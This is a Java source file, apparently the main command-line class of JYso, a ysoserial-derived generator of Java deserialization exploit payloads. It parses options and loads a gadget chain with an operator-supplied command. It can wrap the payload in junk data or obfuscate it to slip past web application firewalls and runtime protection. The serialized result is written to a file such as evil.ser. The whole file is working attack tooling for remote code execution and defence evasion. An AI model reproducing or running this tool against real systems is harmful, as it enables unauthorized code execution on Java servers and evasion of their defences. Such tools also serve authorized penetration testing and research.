package com.qi4l.JYso.gadgets.Config;

import com.qi4l.JYso.gadgets.ObjectPayload;
import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Serializer;
import com.qi4l.JYso.gadgets.utils.StringUtil;
import com.qi4l.JYso.gadgets.utils.dirty.DirtyDataWrapper;
import org.apache.commons.cli.*;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;

import static com.qi4l.JYso.gadgets.Config.Config.logo;
import static com.qi4l.JYso.gadgets.utils.StringUtil.isFromExploit;

public class ysoserial {

    private static final Logger log = LogManager.getLogger(ysoserial.class);
    public static CommandLine cmdLine;
    public static Object PAYLOAD = null;

    public static void run(String[] args) {
        final Options options = getOptions();

        CommandLineParser parser = new DefaultParser();

        if (args.length == 1) {
            printUsage(options);
            System.exit(1);
        }

        try {
            cmdLine = parser.parse(options, args);
        } catch (Exception e) {
            System.out.println("[*] Parameter input error, please use -h for more information");
            printUsage(options);
            System.exit(1);
        }

        if (cmdLine.hasOption("inherit")) {
            Config.IS_INHERIT_ABSTRACT_TRANSLET = true;
        }

        if (cmdLine.hasOption("obscure")) {
            Config.IS_OBSCURE = true;
        }

        if (cmdLine.hasOption("define-class-from-parameter")) {
            Config.PARAMETER = cmdLine.getOptionValue("define-class-from-parameter");
        }

        if (cmdLine.hasOption("file")) {
            Config.WRITE_FILE = true;
            Config.FILE = cmdLine.getOptionValue("file");
        }

        if (cmdLine.hasOption("base64")) {
            Config.BASE64 = true;
        }

        if (cmdLine.hasOption("no-com-sun")) {
            Config.FORCE_USING_ORG_APACHE_TEMPLATESIMPL = true;
        }

        if (cmdLine.hasOption("mozilla-class-loader")) {
            Config.USING_MOZILLA_DEFININGCLASSLOADER = true;
        }

        if (cmdLine.hasOption("rhino")) {
            Config.USING_RHINO = true;
        }

        if (cmdLine.hasOption("utf8-Overlong-Encoding")) {
            Config.IS_UTF_Bypass = true;
        }

        final String payloadType = cmdLine.getOptionValue("gadget");
        final String command = cmdLine.getOptionValue("parameters");
        //载入gadget
        final Class<? extends ObjectPayload<?>> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            printUsage(options);
            System.exit(1);
            return;
        }


        try {
            //载入payload
            ObjectPayload<?> payload = payloadClass.newInstance();
            Object object = payload.getObject(command);

            // 是否指定混淆
            if (cmdLine.hasOption("dirty-type") && cmdLine.hasOption("dirty-length")) {
                int type = Integer.parseInt(cmdLine.getOptionValue("dirty-type"));
                int length = Integer.parseInt(cmdLine.getOptionValue("dirty-length"));
                object = new DirtyDataWrapper(object, type, length).doWrap();
            }

            // 储存生成的 payload
            PAYLOAD = object;
            if (isFromExploit()) {
                return;
            }

            OutputStream out;

            if (Config.WRITE_FILE) {
                out = Files.newOutputStream(Paths.get(Config.FILE));
            }  else if(Config.BASE64) {
                out = new ByteArrayOutputStream();
            } else {
                out = System.out;
            }
            Serializer.qi_serialize(object, out);
            ObjectPayload.Utils.releasePayload(payload, object);
            out.flush();
            out.close();
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            log.error(String.valueOf(e));
        }
    }

    public static Options getOptions() {
        Options options = new Options();
        options.addOption("y", "ysoserial", false, "Java deserialization");
        options.addOption("g", "gadget", true, "Java deserialization gadget");
        options.addOption("p", "parameters", true, "Gadget parameters");
        options.addOption("dt", "dirty-type", true, "Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in Serialized Data");
        options.addOption("dl", "dirty-length", true, "Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2");
        options.addOption("f", "file", true, "Write Output into FileOutputStream (Specified FileName)");
        options.addOption("o", "obscure", false, "Using reflection to bypass RASP");
        options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not (Lower JDK like 1.6 should inherit)");
        options.addOption("rh", "rhino", false, "ScriptEngineManager Using Rhino Engine to eval JS");
        options.addOption("ncs", "no-com-sun", false, "Force Using org.apache.XXX.TemplatesImpl instead of com.sun.org.apache.XXX.TemplatesImpl");
        options.addOption("mcl", "mozilla-class-loader", false, "Using org.mozilla.javascript.DefiningClassLoader in TransformerUtil");
        options.addOption("dcfp", "define-class-from-parameter", true, "Customize parameter name when using DefineClassFromParameter");
        options.addOption("utf", "utf8-Overlong-Encoding", false, "UTF-8 Overlong Encoding Bypass waf");
        options.addOption("b64", "base64", false, "base64 encoding");
        return options;
    }

    private static void printUsage(Options options) {
        logo();
        System.err.println("[root]#~  Usage: java -jar JYso-[version].jar -y -g [payload] -p [command] [options]");
        System.err.println("[root]#~  Available payload types:");

        final List<Class<? extends ObjectPayload<?>>> payloadClasses =
                new ArrayList<>(ObjectPayload.Utils.getPayloadClasses());
        payloadClasses.sort(new StringUtil.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<>();
        rows.add(new String[]{"Payload", "Authors", "Dependencies"});
        rows.add(new String[]{"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload<?>> payloadClass : payloadClasses) {
            rows.add(new String[]{
                    payloadClass.getSimpleName(),
                    StringUtil.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                    StringUtil.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "")
            });
        }

        final List<String> lines = StringUtil.formatTable(rows);

        for (String line : lines) {
            System.err.println("       " + line);
        }

        System.err.println("\r\n");
        HelpFormatter helpFormatter = new HelpFormatter();
        helpFormatter.setWidth(Math.min(200, jline.Terminal.getTerminal().getTerminalWidth()));
        helpFormatter.printHelp("JYso-[version].jar", options, true);

        System.err.println("\r\n");
        System.err.println("Recommended Usage: -y -g [payload] -p '[command]' -dt 1 -dl 50000 -o -i -f evil.ser");
        System.err.println("If you want your payload being extremely short，you could just use:");
        System.err.println("java -jar JYso-[version].jar -y -g [payload] -p '[command]' -i -f evil.ser");
        System.exit(0);
    }

}
